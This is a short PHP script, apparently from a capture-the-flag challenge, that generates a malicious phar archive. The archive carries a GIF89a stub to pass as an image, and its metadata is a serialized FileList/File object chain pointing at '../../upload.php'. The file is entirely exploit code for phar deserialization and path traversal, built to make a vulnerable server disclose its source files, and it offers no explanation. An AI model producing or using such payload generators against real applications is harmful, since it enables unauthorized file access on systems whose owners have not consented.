<?php
    class User{
        public $db;
    }
    class File{
        public $filename;
    }
    class FileList {
        private $files;

        public function __construct() {
            $file = new File();
            $file -> filename = "../../upload.php";
            $this -> files = array($file);

        }
    }
    $phar = new Phar("phar.phar");
    $phar -> startBuffering();
    $phar -> setStub('GIF89a'."<?php __HALT_COMPILER();?>");
    $phar -> addFromString('test.txt', 'test');

    $user = new User();
    $object = new FileList();
    
    $user -> db = $object;
    $phar -> setMetadata($object);
    $phar -> stopBuffering();
?>